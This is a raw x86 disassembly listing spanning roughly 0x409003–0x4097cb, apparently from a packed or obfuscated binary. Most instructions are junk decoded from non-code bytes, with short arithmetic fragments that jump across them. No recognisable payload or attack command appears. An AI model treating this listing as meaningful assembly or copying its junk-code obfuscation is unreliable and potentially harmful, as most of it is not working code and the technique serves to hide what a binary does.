  409003:	sub    BYTE PTR [edi-0x6c410494],bh
  409009:	dec    ebp
  40900a:	popf   
  40900b:	into   
  40900c:	daa    
  40900d:	popa   
  40900e:	push   edx
  40900f:	mov    eax,ds:0xdd671ec6
  409014:	sbb    eax,0xdf9ef131
  409019:	sahf   
  40901a:	add    DWORD PTR [edx-0x26],edi
  40901d:	(bad)  
  40901e:	cwde   
  40901f:	lea    esi,[eax]
  409021:	dec    eax
  409022:	jle    0x40901a
  409024:	jmp    0xb272dc8
  409029:	test   eax,0xbf0342c0
  40902e:	(bad)  
  40902f:	leave  
  409030:	mov    BYTE PTR [eax],dh
  409032:	stos   BYTE PTR es:[edi],al
  409033:	test   DWORD PTR [edx+0x5f9d7f12],edi
  409039:	aaa    
  40903a:	add    eax,0x21eb8272
  40903f:	and    eax,0x49cb2fe8
  409044:	jmp    0xe70e:0xf1f211b8
  40904b:	(bad)  
  40904c:	sar    esp,cl
  40904e:	mov    al,ds:0x80eaca52
  409053:	in     eax,dx
  409054:	cmp    al,0x90
  409056:	ins    BYTE PTR es:[edi],dx
  409057:	cmp    DWORD PTR [ebp-0x371d82bb],eax
  40905d:	xor    DWORD PTR [ebp+0xa],esp
  409060:	repnz mov cl,0xb9
  409063:	xlat   BYTE PTR ds:[ebx]
  409064:	adc    BYTE PTR [esi*4-0x3b92cf0b],0x67
  40906c:	ss daa 
  40906e:	adc    dh,BYTE PTR [ebx+0x58]
  409071:	mov    ah,0x89
  409073:	pop    ebx
  409074:	fimul  DWORD PTR [eax-0xed93b92]
  40907a:	int3   
  40907b:	lahf   
  40907c:	pop    ebx
  40907d:	test   eax,0xcfbcdf25
  409082:	xchg   esp,eax
  409083:	jg     0x409006
  409085:	es push cs
  409087:	or     DWORD PTR [esi],ebx
  409089:	lahf   
  40908a:	ja     0x40904c
  40908c:	sub    DWORD PTR [ebx],ebp
  40908e:	mov    dl,0x10
  409090:	adc    DWORD PTR [ebx],edi
  409092:	mov    WORD PTR [eax-0x22f88fa6],es
  409098:	xor    eax,0x29725c71
  40909d:	add    eax,0xc1e87680
  4090a2:	sub    DWORD PTR [ebp+0x4c],esi
  4090a5:	ds cmp esi,ebx
  4090a8:	les    eax,FWORD PTR [edi+0x3b]
  4090ab:	pop    ebx
  4090ac:	leave  
  4090ad:	neg    cl
  4090af:	les    edi,FWORD PTR [esi]
  4090b1:	sub    eax,DWORD PTR [esi]
  4090b3:	jmp    0x59d87f37
  4090b8:	fistp  QWORD PTR [ebp-0x2a]
  4090bb:	xlat   BYTE PTR ds:[ebx]
  4090bc:	mov    edx,0x528d223e
  4090c1:	and    DWORD PTR ds:0x48200461,0xe1ee3a49
  4090cb:	into   
  4090cc:	jo     0x4090fd
  4090ce:	loope  0x4090d1
  4090d0:	cmp    eax,0x5c7f03b
  4090d5:	add    DWORD PTR [eax+0x7b750042],ebp
  4090db:	add    BYTE PTR [eax],al
  4090dd:	jne    0x4093c9
  4090e3:	jmp    0x4093a9
  4090e8:	retf   0xd0cb
  4090eb:	cmp    eax,0xcbd9d1d5
  4090f0:	mov    edx,0x5ca4c6c4
  4090f5:	les    edi,FWORD PTR [edi+0xc]
  4090f8:	mov    gs,edi
  4090fa:	js     0x409174
  4090fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090fd:	jle    0x409177
  4090ff:	js     0x4090e8
  409101:	iret   
  409102:	test   al,0xe8
  409104:	out    0x49,al
  409106:	test   DWORD PTR [edx+ebp*2-0x34dfa4b],0xc6127a7a
  409111:	pop    ecx
  409112:	or     ebp,edi
  409114:	pop    ecx
  409115:	push   ebx
  409116:	xlat   BYTE PTR ds:[ebx]
  409117:	mov    ds:0x7ed17d31,al
  40911c:	sbb    BYTE PTR cs:[eax+0x77],cl
  409120:	xor    eax,DWORD PTR [edx+0x792d7b2]
  409126:	sub    al,0xee
  409128:	imul   ebp,DWORD PTR [ecx],0x24
  40912b:	lods   eax,DWORD PTR ds:[esi]
  40912c:	pop    esi
  40912d:	dec    esi
  40912e:	ret    
  40912f:	push   ss
  409130:	and    eax,0x9bb66e21
  409135:	xlat   BYTE PTR ds:[ebx]
  409136:	mulps  xmm2,xmm1
  409139:	xchg   esp,eax
  40913a:	dec    ecx
  40913b:	push   cs
  40913c:	mov    es,WORD PTR [eax+esi*4]
  40913f:	sar    BYTE PTR [edi+0x618a3d5c],0xd3
  409146:	cmp    ebp,DWORD PTR fs:[esi-0x31]
  40914a:	and    ebx,DWORD PTR [ecx+0x3f8eaa8a]
  409150:	mov    ds:0x8eba4f70,al
  409155:	mov    ds:0x184b6f8a,al
  40915a:	ins    DWORD PTR es:[edi],dx
  40915b:	popf   
  40915c:	push   edi
  40915d:	and    eax,0x66e00c93
  409162:	in     eax,dx
  409163:	out    0xe5,eax
  409165:	push   esp
  409166:	push   ss
  409167:	sub    al,0x11
  409169:	mov    esp,0xcb6262c0
  40916e:	cmc    
  40916f:	jp     0x409134
  409171:	pop    ds
  409172:	inc    ecx
  409173:	lock cmc 
  409175:	pop    ebp
  409176:	sub    BYTE PTR [eax],al
  409178:	push   ebp
  409179:	fwait
  40917a:	(bad)  
  40917b:	outs   dx,BYTE PTR ds:[esi]
  40917c:	(bad)  
  40917d:	adc    ebp,DWORD PTR [edx]
  40917f:	pop    eax
  409180:	in     eax,dx
  409181:	(bad)  
  409182:	xor    esi,DWORD PTR [ebx]
  409184:	in     al,0xb1
  409186:	or     DWORD PTR [ebp+eiz*8-0x50],esp
  40918a:	call   0x402bbfcc
  40918f:	out    dx,eax
  409190:	fnstsw WORD PTR [ebx-0x1105cccc]
  409196:	mov    bl,0x67
  409198:	sub    bl,BYTE PTR [ebx]
  40919a:	push   ebx
  40919b:	fist   WORD PTR [eax+0x4e]
  40919e:	(bad)  
  40919f:	retf   
  4091a0:	in     al,0x3c
  4091a2:	xor    DWORD PTR gs:[edi-0x60],ebp
  4091a6:	jg     0x40913f
  4091a8:	fidiv  WORD PTR ds:0x31011cb4
  4091ae:	add    dl,BYTE PTR [ecx-0x4c]
  4091b1:	jno    0x4091a0
  4091b3:	(bad)  
  4091b4:	fbstp  TBYTE PTR [ebx-0x7d]
  4091b7:	ret    0xef4b
  4091ba:	fild   QWORD PTR [ecx]
  4091bc:	mov    edx,0xab6dfc38
  4091c1:	jae    0x40914d
  4091c3:	push   ebp
  4091c4:	add    edi,edx
  4091c6:	test   DWORD PTR [ebp+0x38],ecx
  4091c9:	xchg   ebx,eax
  4091ca:	ret    
  4091cb:	test   cl,al
  4091cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091ce:	(bad)  
  4091cf:	(bad)  
  4091d0:	sbb    DWORD PTR [edx-0x2cba9534],ecx
  4091d6:	mov    edi,0x5b101028
  4091db:	sub    eax,0xe9605673
  4091e0:	hlt    
  4091e1:	loop   0x4091e3
  4091e3:	icebp  
  4091e4:	pop    ebx
  4091e5:	sbb    bh,BYTE PTR [ecx]
  4091e7:	aam    0x7e
  4091e9:	xor    al,0x22
  4091eb:	pop    ebp
  4091ec:	jo     0x40916e
  4091ee:	inc    ebp
  4091ef:	pop    edx
  4091f0:	ss mov dh,0x2e
  4091f3:	cmp    BYTE PTR [edx-0x2e],0xbf
  4091f7:	cmp    BYTE PTR [esi],0xde
  4091fa:	not    BYTE PTR [esi-0x6832d137]
  409200:	call   0xef3ee71
  409205:	shl    BYTE PTR [edx],1
  409207:	ror    BYTE PTR cs:[edi-0x25b298c3],cl
  40920e:	dec    esi
  40920f:	aaa    
  409210:	jno    0x40922a
  409212:	rol    BYTE PTR [ebp+0x0],1
  409215:	and    al,0x4
  409217:	mul    DWORD PTR [eax+0x754de2ad]
  40921d:	aaa    
  40921e:	fmul   st,st(7)
  409220:	adc    BYTE PTR [ebp+ecx*1-0x1eb9628],cl
  409227:	(bad)  
  409228:	jmp    0xc86f1a63
  40922d:	push   esp
  40922e:	xchg   ebx,eax
  40922f:	int3   
  409230:	test   dl,bl
  409232:	push   0x6752fdd
  409237:	test   eax,0xa5e9bd3e
  40923c:	in     al,0x8c
  40923e:	test   BYTE PTR [eax],al
  409240:	jge    0x4092a2
  409242:	push   es
  409243:	inc    eax
  409244:	cs adc dh,ah
  409247:	enter  0x7a82,0x70
  40924b:	xor    DWORD PTR [esi-0x48],0x54
  40924f:	out    0xe7,eax
  409251:	(bad)  
  409252:	mov    al,0x82
  409254:	xchg   edx,eax
  409255:	inc    ebx
  409256:	add    BYTE PTR [ecx-0x5b],0x2d
  40925a:	inc    esi
  40925b:	aas    
  40925c:	mov    ecx,0xd6555f06
  409261:	and    edx,ebp
  409263:	dec    ecx
  409264:	mov    ecx,0x9d92482e
  409269:	adc    al,0xf0
  40926b:	cdq    
  40926c:	test   eax,0xb020f0c
  409271:	out    0x51,al
  409273:	jmp    0x4092d0
  409275:	mov    cl,0xd7
  409277:	push   edi
  409278:	test   al,0xfd
  40927a:	sbb    BYTE PTR [edi],0xe0
  40927d:	jl     0x40925b
  40927f:	jbe    0x409291
  409281:	pusha  
  409282:	sbb    cl,BYTE PTR [edi]
  409284:	in     eax,0xce
  409286:	(bad)  
  409287:	or     DWORD PTR [edx],ebp
  409289:	bound  esp,QWORD PTR [edi]
  40928b:	sub    DWORD PTR [eax+0x21],esi
  40928e:	sbb    eax,0xe6846207
  409293:	cld    
  409294:	out    0x37,eax
  409296:	(bad)  
  409297:	cmp    ah,BYTE PTR [edx]
  409299:	xor    ebx,DWORD PTR [ebx-0x36]
  40929c:	xlat   BYTE PTR ds:[ebx]
  40929d:	pop    edx
  40929e:	rcr    edi,1
  4092a0:	inc    edi
  4092a1:	test   al,0x63
  4092a3:	push   cs
  4092a4:	push   esi
  4092a5:	iret   
  4092a6:	fsub   DWORD PTR [edx]
  4092a8:	test   ebp,0x2114316f
  4092ae:	je     0x4092b9
  4092b0:	lods   al,BYTE PTR ds:[esi]
  4092b1:	jmp    0x40930c
  4092b3:	ins    DWORD PTR es:[edi],dx
  4092b4:	out    dx,al
  4092b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092b6:	jecxz  0x4092cb
  4092b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092b9:	icebp  
  4092ba:	xor    al,dl
  4092bc:	pop    esp
  4092bd:	adc    DWORD PTR [edi],ebx
  4092bf:	xchg   esp,eax
  4092c0:	gs and al,0xcf
  4092c3:	retf   
  4092c4:	sbb    cl,BYTE PTR [esi-0x425de6c5]
  4092ca:	ret    
  4092cb:	cli    
  4092cc:	mov    dh,BYTE PTR [ebp-0x7a]
  4092cf:	mov    bl,0x6
  4092d1:	mov    edi,0xc09f680b
  4092d6:	push   es
  4092d7:	stc    
  4092d8:	xor    DWORD PTR [esi+0x45],ebx
  4092db:	xchg   ebx,eax
  4092dc:	les    ebp,FWORD PTR [esi+0x45d2eb7f]
  4092e2:	add    ch,BYTE PTR [ebp-0x5e7586be]
  4092e8:	adc    BYTE PTR [edi],0xb5
  4092eb:	stc    
  4092ec:	mov    esp,0x9428a396
  4092f1:	adc    al,0x91
  4092f3:	pop    edi
  4092f4:	fidivr WORD PTR ds:0x615c7424
  4092fa:	add    edx,DWORD PTR [ebp+0x24]
  4092fd:	arpl   WORD PTR [ebp+0x6a],dx
  409300:	in     al,0xa7
  409302:	es (bad) 
  409304:	repz (bad) 
  409307:	bound  ecx,QWORD PTR [ebx]
  409309:	into   
  40930a:	cmc    
  40930b:	inc    ebx
  40930c:	or     esi,esp
  40930e:	dec    edi
  40930f:	mov    ah,0x12
  409311:	jg     0x40936b
  409313:	xor    eax,0xfff21268
  409318:	dec    esp
  409319:	fidiv  DWORD PTR [ebx+0x69]
  40931c:	dec    esi
  40931d:	icebp  
  40931e:	test   al,0xad
  409320:	fisubr DWORD PTR [ebp+ebx*4+0x778df0a0]
  409327:	repz jno 0x409365
  40932a:	or     BYTE PTR [ebx+0x63],ah
  40932d:	int    0xf6
  40932f:	shl    BYTE PTR [ebx],cl
  409331:	out    dx,al
  409332:	(bad)  
  409333:	and    eax,0x74d7710b
  409338:	xchg   ebp,eax
  409339:	or     eax,0x710745d7
  40933e:	adc    eax,0x54f3cd00
  409343:	outs   dx,DWORD PTR ds:[esi]
  409344:	std    
  409345:	pop    edi
  409346:	xor    al,0x79
  409348:	dec    eax
  409349:	jno    0x409358
  40934b:	test   BYTE PTR ds:0xd01cd0a,bl
  409351:	inc    edi
  409352:	cmp    eax,DWORD PTR [ebx-0x2c]
  409355:	mov    ebx,0xdd059648
  40935a:	inc    edi
  40935b:	sti    
  40935c:	mov    ch,0x2a
  40935e:	push   0x1b
  409360:	mov    esp,0x9497fc39
  409365:	mov    ebx,cs
  409367:	call   0x69d40dfe
  40936c:	cmp    ebx,ebp
  40936e:	out    0xb0,eax
  409370:	pop    ss
  409371:	xor    BYTE PTR [ebx-0x68341fac],cl
  409377:	and    dl,BYTE PTR ds:0x56b5bc81
  40937d:	mov    WORD PTR [eax],ds
  40937f:	popf   
  409380:	pop    esi
  409381:	ja     0x409319
  409383:	in     al,dx
  409384:	mov    ch,0x1e
  409386:	fwait
  409387:	ja     0x4093e8
  409389:	outs   dx,DWORD PTR ds:[esi]
  40938a:	cmp    DWORD PTR [eax-0x5d],0x35
  40938e:	in     eax,0xbf
  409390:	mov    esp,0x9326acff
  409395:	loope  0x409403
  409397:	dec    edi
  409398:	(bad)  
  409399:	mov    esp,0x2c266ee2
  40939e:	div    DWORD PTR [edi]
  4093a0:	shl    BYTE PTR [esp+esi*8-0x18161c31],0x8
  4093a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093a9:	mov    eax,DWORD PTR [ebp-0x4]
  4093ac:	add    DWORD PTR ds:0x42a7b9,0x42a769
  4093b6:	mov    esi,DWORD PTR [ebp-0x8]
  4093b9:	xor    eax,edx
  4093bb:	xor    esi,edx
  4093bd:	add    eax,ecx
  4093bf:	add    esi,ecx
  4093c1:	imul   eax,esi
  4093c4:	jmp    0x4096ca
  4093c9:	mov    eax,DWORD PTR [ebp+0xc]
  4093cc:	mov    eax,DWORD PTR [eax+0x78]
  4093cf:	mov    DWORD PTR [ebp+0xc],eax
  4093d2:	mov    eax,DWORD PTR [ebp-0x4]
  4093d5:	mov    esi,DWORD PTR [ebp-0x8]
  4093d8:	xor    eax,edx
  4093da:	xor    esi,edx
  4093dc:	add    eax,ecx
  4093de:	add    esi,ecx
  4093e0:	imul   eax,esi
  4093e3:	mov    esi,DWORD PTR [ebp+0xc]
  4093e6:	cmp    esi,eax
  4093e8:	jmp    0x4096ae
  4093ed:	xlat   BYTE PTR ds:[ebx]
  4093ee:	leave  
  4093ef:	retf   0xdad6
  4093f2:	aad    0xdb
  4093f4:	leave  
  4093f5:	adc    bl,BYTE PTR ds:0xe19eff3d
  4093fb:	add    eax,0x78ec3574
  409400:	js     0x4093a9
  409402:	jle    0x40947c
  409404:	js     0x4093bb
  409406:	ret    0xd1dd
  409409:	addr16 gs iret 
  40940c:	pushf  
  40940d:	sbb    al,0x87
  40940f:	push   0x36
  409411:	xor    eax,DWORD PTR [esi-0x27bc5366]
  409417:	loope  0x4093cf
  409419:	sub    edx,DWORD PTR [ecx-0x6d]
  40941c:	jae    0x409481
  40941e:	xchg   edi,eax
  40941f:	adc    al,bl
  409421:	push   ebp
  409422:	popa   
  409423:	stos   BYTE PTR es:[edi],al
  409424:	xchg   edx,eax
  409425:	pshufw mm1,QWORD PTR [esi],0x35
  409429:	ins    BYTE PTR es:[edi],dx
  40942a:	jns    0x40948c
  40942c:	leave  
  40942d:	mov    ds,edi
  40942f:	stos   DWORD PTR es:[edi],eax
  409430:	in     al,dx
  409431:	cmp    DWORD PTR [edi+eiz*8+0x7b],ecx
  409435:	test   eax,0x5053446a
  40943a:	iret   
  40943b:	repz into 
  40943d:	dec    ecx
  40943e:	dec    eax
  40943f:	js     0x40941c
  409441:	push   ebp
  409442:	mov    ebx,0xd75558d2
  409447:	mov    esp,0x90b08bbb
  40944c:	stc    
  40944d:	sahf   
  40944e:	scas   eax,DWORD PTR es:[edi]
  40944f:	push   ds
  409450:	es adc eax,0x48753626
  409456:	movzx  edi,BYTE PTR [eax]
  409459:	pop    ebx
  40945a:	movlhps xmm7,xmm7
  40945d:	fistp  QWORD PTR [ebx]
  40945f:	ud1    edx,DWORD PTR [ebp-0x39]
  409463:	add    DWORD PTR [edx-0x25],ecx
  409466:	jp     0x409488
  409468:	jo     0x409468
  40946a:	mov    al,bl
  40946c:	mov    ebp,cs
  40946e:	sbb    ah,al
  409470:	std    
  409471:	shl    BYTE PTR [eax-0x62],0x72
  409475:	push   eax
  409476:	push   0x61
  409478:	out    0x3,al
  40947a:	cmc    
  40947b:	lahf   
  40947c:	nop
  40947d:	add    eax,esi
  40947f:	mov    ecx,ecx
  409481:	or     al,0x39
  409483:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409484:	jmp    0xb531:0xb51bd968
  40948b:	ds gs cmp edx,esi
  40948f:	call   0x46df:0x49369884
  409496:	out    dx,eax
  409497:	adc    bh,BYTE PTR [ebx]
  409499:	rcl    BYTE PTR [eax],1
  40949b:	xchg   DWORD PTR [ecx-0xff23493],edx
  4094a1:	in     al,dx
  4094a2:	and    esi,DWORD PTR [ecx+eiz*8-0x6aa8c540]
  4094a9:	cmp    eax,0x6d42ed2b
  4094ae:	fsubr  QWORD PTR [edi-0x4f6d2039]
  4094b4:	enter  0xa23d,0xa9
  4094b8:	and    DWORD PTR [edi+esi*1+0x0],eax
  4094bc:	imul   ebp,DWORD PTR [eax],0x5
  4094bf:	aam    0x15
  4094c1:	mov    bl,0xb4
  4094c3:	mov    dh,0x21
  4094c5:	or     esp,DWORD PTR [eax+0x25388c6b]
  4094cb:	jns    0x409477
  4094cd:	mov    ch,0xae
  4094cf:	in     eax,0x6e
  4094d1:	mov    ?,WORD PTR [edi]
  4094d3:	mov    edx,0x86653ec8
  4094d9:	or     al,0xe5
  4094db:	dec    esp
  4094dc:	mov    cl,0xbb
  4094de:	cld    
  4094df:	out    dx,eax
  4094e0:	push   0xffffff97
  4094e2:	push   esi
  4094e3:	cmp    bh,BYTE PTR [ecx+0x66db44d9]
  4094e9:	call   FWORD PTR [eax+0x7315facb]
  4094ef:	mov    ds:0x9a02ce37,al
  4094f4:	or     al,0xb1
  4094f6:	out    0x4,eax
  4094f8:	sub    esi,DWORD PTR [ebx]
  4094fa:	cdq    
  4094fb:	pop    DWORD PTR [edi-0xe]
  4094fe:	fwait
  4094ff:	push   ss
  409500:	dec    edx
  409501:	fwait
  409502:	aas    
  409503:	mov    ah,0xa4
  409505:	popf   
  409506:	inc    esp
  409507:	jmp    0x8895ed9b
  40950c:	stc    
  40950d:	push   esp
  40950e:	xchg   DWORD PTR [esi+0x335dff0a],esi
  409514:	popa   
  409515:	out    dx,al
  409516:	pushf  
  409517:	mov    DWORD PTR [ecx+ebx*4],eax
  40951a:	cwde   
  40951b:	fnstcw WORD PTR [edi+0x3f]
  40951e:	or     eax,0x3b24e5c7
  409523:	neg    esi
  409525:	repz push ds
  409527:	add    al,0x6f
  409529:	xchg   esp,eax
  40952a:	inc    edx
  40952b:	dec    esp
  40952c:	dec    ebx
  40952d:	push   0xe2814991
  409532:	jmp    0x4094f2
  409534:	out    dx,eax
  409535:	jmp    0x5c8c0d9b
  40953a:	clc    
  40953b:	dec    esp
  40953c:	pop    ebp
  40953d:	jbe    0x40952f
  40953f:	pop    es
  409540:	cmp    BYTE PTR [edx+0x41e09a89],bl
  409546:	mov    BYTE PTR [esi-0x7f],dh
  409549:	dec    esp
  40954a:	les    edi,FWORD PTR [edx-0x2]
  40954d:	(bad)  
  40954e:	mov    dh,0x52
  409550:	mov    eax,0x31b60de1
  409555:	xchg   ecx,eax
  409556:	push   eax
  409557:	shl    BYTE PTR ds:0xd5954f5f,cl
  40955d:	sbb    ch,bl
  40955f:	dec    edi
  409560:	nop
  409561:	push   0xffffffb1
  409563:	(bad)  
  409564:	mov    al,ds:0x19613544
  409569:	mov    ebp,0x3c4f1e43
  40956e:	je     0x409527
  409570:	fimul  WORD PTR [esi]
  409572:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409574:	ja     0x40955f
  409576:	aam    0x2a
  409578:	sahf   
  409579:	and    BYTE PTR [ecx-0x4b],bh
  40957c:	push   0xe7976607
  409581:	ins    BYTE PTR es:[edi],dx
  409582:	out    dx,eax
  409583:	pop    edi
  409584:	cmp    DWORD PTR [edi],esp
  409586:	nop
  409587:	shl    BYTE PTR [edx+ebp*1],0xfd
  40958b:	arpl   WORD PTR [ecx-0x59],sp
  40958e:	cmp    ebp,DWORD PTR [ecx]
  409590:	scas   al,BYTE PTR es:[edi]
  409591:	dec    esp
  409592:	ret    0x871b
  409595:	push   ebp
  409596:	shl    DWORD PTR [eax+0x69],1
  409599:	enter  0xe87c,0x7a
  40959d:	inc    edi
  40959e:	or     BYTE PTR ds:0x118d347a,cl
  4095a4:	cmovb  ebp,DWORD PTR [edi+ecx*4-0x5b]
  4095a9:	out    0x65,eax
  4095ab:	daa    
  4095ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4095ad:	call   0xacde1baa
  4095b2:	nop
  4095b3:	aad    0x6a
  4095b5:	mov    ch,dh
  4095b7:	push   esi
  4095b8:	repz jge 0x409573
  4095bb:	jae    0x40957d
  4095bd:	mov    cl,cl
  4095bf:	mov    ebx,0xd23dc69a
  4095c4:	aaa    
  4095c5:	cmp    DWORD PTR [edx],esi
  4095c7:	mov    cs,WORD PTR [esi-0x6a90b44]
  4095cd:	mov    ah,0x57
  4095cf:	ret    
  4095d0:	pushf  
  4095d1:	dec    ebx
  4095d2:	sub    eax,0xfc47e7b0
  4095d7:	add    BYTE PTR [esp+ebp*2],0xcd
  4095db:	mov    ah,0xa4
  4095dd:	add    BYTE PTR [esi+0x54],dh
  4095e0:	push   ds
  4095e1:	push   edi
  4095e2:	ins    BYTE PTR es:[edi],dx
  4095e3:	or     BYTE PTR [ebp-0x25b72cb1],bl
  4095e9:	in     al,dx
  4095ea:	mov    dh,0xe3
  4095ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095ed:	fcmovnu st,st(7)
  4095ef:	in     al,dx
  4095f0:	bound  edi,QWORD PTR [esi+0x8]
  4095f3:	out    dx,al
  4095f4:	push   edi
  4095f5:	push   ebx
  4095f6:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4095f8:	jb     0x4095d5
  4095fa:	psrlq  mm4,QWORD PTR [ebx]
  4095fd:	push   ebx
  4095fe:	fdivrp st(5),st
  409600:	mov    ebp,0x2128a029
  409605:	xchg   ch,bh
  409607:	mov    ds:0x299330cd,eax
  40960c:	mov    bl,0x86
  40960e:	in     eax,dx
  40960f:	or     ebp,DWORD PTR [eax+edx*2]
  409612:	jno    0x409628
  409614:	push   edx
  409615:	dec    esi
  409616:	jge    0x4095b3
  409618:	adc    esi,DWORD PTR [ecx+0x54]
  40961b:	cmp    DWORD PTR [esp+edx*4+0x33],edx
  40961f:	mov    ds:0xbd124f11,al
  409624:	ins    DWORD PTR es:[edi],dx
  409625:	cmp    BYTE PTR [esi+0x36],dl
  409628:	fisub  WORD PTR [edi+0x3ed5cbef]
  40962e:	push   ebp
  40962f:	lds    ebx,FWORD PTR [edi]
  409631:	and    eax,0x8dfce28c
  409636:	ret    0xbb0f
  409639:	push   edx
  40963a:	ja     0x4095f4
  40963c:	cli    
  40963d:	fidivr WORD PTR [eax-0x72]
  409640:	in     eax,dx
  409641:	stc    
  409642:	xchg   edi,esi
  409644:	inc    ebp
  409645:	push   ebx
  409646:	mov    edx,0x7935db3d
  40964b:	mov    al,0x24
  40964d:	xchg   ecx,eax
  40964e:	out    0x26,al
  409650:	cmp    BYTE PTR [edx+edx*1+0x7354602a],0xe6
  409658:	mov    al,ds:0x5171b0db
  40965d:	xchg   ecx,eax
  40965e:	(bad)  
  40965f:	push   esp
  409660:	imul   eax,DWORD PTR [ebp+edx*8+0x1ad970f1],0xa
  409668:	dec    esi
  409669:	push   ebx
  40966a:	push   cs
  40966b:	fwait
  40966c:	jmp    DWORD PTR [esp+esi*1-0x452aa483]
  409673:	sub    dl,BYTE PTR [edx]
  409675:	xchg   ebx,eax
  409676:	inc    ecx
  409677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409678:	mov    bl,0x54
  40967a:	outs   dx,BYTE PTR ds:[esi]
  40967b:	push   eax
  40967c:	xchg   dh,bh
  40967e:	jne    0x4096eb
  409680:	in     al,0xc
  409682:	(bad)  
  409683:	dec    esi
  409684:	or     al,0xd
  409686:	mov    ds,esi
  409688:	mov    ebp,0xe45ed309
  40968d:	outs   dx,BYTE PTR ds:[esi]
  40968e:	sti    
  40968f:	adc    eax,0x3410ca09
  409694:	xchg   ebx,eax
  409695:	or     al,0xa
  409697:	loop   0x4096ef
  409699:	(bad)  
  40969a:	lods   al,BYTE PTR ds:[esi]
  40969b:	and    eax,0x67cf48c4
  4096a0:	mov    esp,DWORD PTR [edi]
  4096a2:	aad    0xbe
  4096a4:	cmp    al,0x3f
  4096a6:	cmc    
  4096a7:	test   BYTE PTR [edi+0x51],bh
  4096aa:	iret   
  4096ab:	jl     0x40970d
  4096ad:	sbb    BYTE PTR [ebx-0x7bf003bb],cl
  4096b3:	cmc    
  4096b4:	cld    
  4096b5:	(bad)  
  4096b6:	push   DWORD PTR [ebx]
  4096b8:	ret    0xc103
  4096bb:	mov    ecx,DWORD PTR [ebp+0xc]
  4096be:	imul   eax,ecx
  4096c1:	add    eax,DWORD PTR [ebp+0x8]
  4096c4:	mov    DWORD PTR [ebp+0xc],eax
  4096c7:	mov    eax,DWORD PTR [ebp+0xc]
  4096ca:	pop    esi
  4096cb:	leave  
  4096cc:	ret    0x8
  4096cf:	push   ebp
  4096d0:	mov    ebp,esp
  4096d2:	jmp    0x4099c5
  4096d7:	leave  
  4096d8:	enter  0x3ed6,0xd9
  4096dc:	(bad)  
  4096dd:	(bad)  
  4096df:	xlat   BYTE PTR ds:[ebx]
  4096e0:	enter  0xc218,0xf7
  4096e4:	stc    
  4096e5:	repnz sbb ebx,DWORD PTR [edx+esi*8+0x78]
  4096ea:	js     0x40973e
  4096ec:	jle    0x409766
  4096ee:	js     0x4096a0
  4096f0:	int    0x50
  4096f2:	inc    ecx
  4096f3:	push   ebp
  4096f4:	out    0xf2,eax
  4096f6:	add    ecx,DWORD PTR [ecx-0x42]
  4096f9:	test   al,0xb3
  4096fb:	lahf   
  4096fc:	mov    ds:0x15c9ae89,eax
  409701:	gs dec esi
  409703:	pop    ds
  409704:	or     al,0xb6
  409706:	(bad)  
  409707:	iret   
  409708:	stos   DWORD PTR es:[edi],eax
  409709:	loope  0x40973a
  40970b:	pop    ebp
  40970c:	pop    es
  40970d:	rep stos BYTE PTR es:[edi],al
  40970f:	xchg   edi,eax
  409710:	pop    ebp
  409711:	adc    eax,0x887dc5da
  409716:	shr    BYTE PTR [edx+0x45a275b6],cl
  40971c:	in     eax,0x81
  40971e:	or     eax,0x9cfe9729
  409723:	dec    ebx
  409724:	adc    dl,BYTE PTR es:0xcdc9a176
  40972b:	js     0x40978a
  40972d:	pop    ss
  40972e:	fistp  WORD PTR [eax]
  409730:	push   eax
  409731:	jnp    0x409759
  409733:	cwde   
  409734:	idiv   DWORD PTR [ebx]
  409736:	mov    eax,ds:0x865aa45c
  40973b:	js     0x40971b
  40973d:	inc    ebx
  40973e:	push   edi
  40973f:	addr16 fcomi st,st(0)
  409742:	adc    eax,0xda045ed6
  409747:	and    eax,0x9976b0cc
  40974c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40974d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40974e:	and    BYTE PTR [ecx],al
  409750:	nop
  409751:	dec    esp
  409752:	inc    ecx
  409753:	outs   dx,DWORD PTR ds:[esi]
  409754:	add    ch,al
  409756:	ins    DWORD PTR es:[edi],dx
  409757:	push   ss
  409758:	retf   0x8d40
  40975b:	sbb    ebp,DWORD PTR [ebx+0x5e351c01]
  409761:	jecxz  0x40976a
  409763:	and    ch,BYTE PTR [esi+0x6cb1498]
  409769:	call   0x32e0:0x5e987c67
  409770:	fld    TBYTE PTR [edx]
  409772:	ret    
  409773:	sub    bh,dl
  409775:	and    DWORD PTR [ecx],0x60
  409778:	mov    bl,0x2b
  40977a:	mov    bh,0x30
  40977c:	retf   
  40977d:	adc    BYTE PTR [ebp+eax*2-0x49],bl
  409781:	sbb    BYTE PTR ds:0x1cc95f91,0x4c
  409788:	adc    al,0x1
  40978a:	pop    ebp
  40978b:	cmp    edx,DWORD PTR [ebp+0x22abb9c7]
  409791:	loope  0x409785
  409793:	(bad)  
  409794:	mov    ah,0xb8
  409796:	(bad)  
  409797:	or     esp,DWORD PTR [edx+0x68e7d473]
  40979d:	push   esp
  40979e:	pop    ds
  40979f:	or     al,0x1a
  4097a1:	sbb    edx,DWORD PTR [edi+0x1]
  4097a4:	push   ecx
  4097a5:	sbb    al,0xf4
  4097a7:	pop    ax
  4097a9:	mov    WORD PTR [edi],ss
  4097ab:	ins    BYTE PTR es:[edi],dx
  4097ac:	sub    DWORD PTR [ebp-0xf184723],esp
  4097b2:	dec    ebx
  4097b3:	in     al,dx
  4097b4:	pop    esp
  4097b5:	push   0xa42b8c5b
  4097ba:	jmp    0x40974b
  4097bc:	xor    eax,0xff58b88b
  4097c1:	push   esp
  4097c2:	xlat   BYTE PTR ds:[ebx]
  4097c3:	in     eax,dx
  4097c4:	push   ecx
  4097c5:	dec    ebp
  4097c6:	aas    
  4097c7:	sti    
  4097c8:	cmp    bl,ah
  4097ca:	dec    esp
  4097cb:	push   ebp
